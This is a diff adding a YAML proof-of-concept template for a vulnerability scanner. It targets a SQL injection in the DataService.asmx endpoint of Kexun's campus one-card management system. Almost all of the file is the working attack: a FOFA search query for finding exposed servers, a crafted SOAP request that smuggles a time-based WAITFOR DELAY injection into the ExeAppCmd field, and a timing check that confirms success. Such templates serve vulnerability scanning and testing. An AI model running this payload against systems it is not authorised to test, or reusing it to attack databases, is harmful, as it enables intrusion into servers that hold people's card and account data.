@@ -1,0 +1,39 @@
+id: poc-yaml-kxsoft-dataservice-asmx-sqli
+info:
+  name: 科讯一卡通管理系统 DataService.asmx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 一卡通管理系统
+  fofa: body="http://www.ahkxsoft.com/" && body="一卡通登录"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /DataService.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: http://tempuri.org/ExeAppCmd
+  data: '<?xml version="1.0" encoding="utf-8"?>
+
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+
+    <soap:Body>
+
+    <ExeAppCmd xmlns="http://tempuri.org/">
+
+    <str>{"cmd":"get_sb_guanli","Type":"1'');WAITFOR DELAY ''0:0:{{.t1}}''--"}</str>
+
+    <files>MTIz</files>
+
+    </ExeAppCmd>
+
+    </soap:Body>
+
+    </soap:Envelope>'
+  expression: "status_code == 200 && \ncontains(body,\"\\\"cmd\\\":\\\"get_sb_guanli\\\
+    \"\") &&\ncontains(body,\"<ExeAppCmdResult>\") &&\ncontains(content_type,\"text/xml\"\
+    ) &&\nduration > t1 &&\nduration < t2\n"
+transport: http
